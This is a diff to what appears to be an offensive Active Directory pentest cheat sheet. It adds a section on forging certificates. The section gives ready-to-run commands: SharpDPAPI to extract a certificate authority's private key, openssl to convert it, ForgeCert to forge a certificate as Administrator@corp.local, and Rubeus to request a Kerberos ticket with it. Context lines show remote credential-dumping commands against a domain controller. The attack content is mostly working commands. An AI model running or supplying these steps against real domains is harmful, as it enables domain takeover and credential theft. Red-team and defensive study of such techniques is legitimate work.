@@ -654,3 +654,49 @@ Get-RemoteLocalAccountHash -ComputerName dc01.corp.local -Verbose
 Import-Module .\DAMP-master\Get-RemoteCachedCredentials
 Get-RemoteCachedCredentials -ComputerName dc01.corp.local -Verbose
 ```
+
+# Forged Certificates
+
+Sometimes AD CS roles are installed on separate servers and not on the DC themselves. And often, they are no treated with the same sensitivity as DCs.
+
+Gaining local admin access to a CA allows an attacker to extract the CA private key, which can be used to sign a forged certificate.
+
+With `SharpDPAPI` we can extract the private keys.
+
+* [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
+
+```powershell
+.\SharpDPAPI.exe certificates /machine
+```
+
+The private CA key has the Issuer and Subject, both the distinguished name of the CA. Save the private key into a `.pem` file and then convert it to `.pfx` with opeenssl.
+
+```
+$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+Enter Export Password:
+Verifying - Enter Export Password:
+```
+
+> **Note** It is recommended to enter a password.
+
+Convert `cert.pfx` into base64.
+
+```
+cat cert.pfx | base64 -w 0
+```
+
+Finally forge a certificate with `ForgeCert`.
+
+* [https://github.com/GhostPack/ForgeCert](https://github.com/GhostPack/ForgeCert)
+
+```powershell
+.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@corp.local" --NewCertPath fake.pfx --NewCertPassword "password"
+```
+
+> **Note**: We need to specify in `SubjectAltName` a existant user in the domain.
+
+With the cerficiate we can ask a TGT.
+
+```
+.\Rubeus asktgt /user:Administrator /certificate:<B64-CERT> /password:password /nowrap
+```
